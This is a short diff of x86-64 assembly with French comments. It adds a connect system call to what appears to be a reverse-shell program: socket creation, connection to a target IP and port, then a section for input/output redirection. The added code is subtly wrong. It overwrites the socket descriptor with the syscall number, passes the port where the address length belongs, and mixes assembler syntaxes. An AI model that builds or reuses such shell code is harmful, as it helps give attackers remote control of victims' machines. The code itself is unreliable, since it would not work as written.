@@ -11,6 +11,10 @@
     SOCK_STREAM: .int 1     ;TCP
     IP_PROTOCOL: .int 0
     ;============================
+    ; Connect section
+    ;============================
+    SYSCALL_CONNECT: .int 42
+    SIZE_TARGET_IP: .int 16
 
 .section .text
     global _start
@@ -45,6 +49,12 @@ create_socket:
 ; Connexion à la cible 
 ; ----------------------------------
 connect:
+    mov rax, SYSCALL_CONNECT
+    mov rdi, rax        ; Socket
+    mov rsi, TARGET_IP
+    mov rdx, TARGET_PORT
+    mov r10, SIZE_TARGET_IP
+    syscall
 
 ; ----------------------------------
 ; Redirection des entrées/sorties 
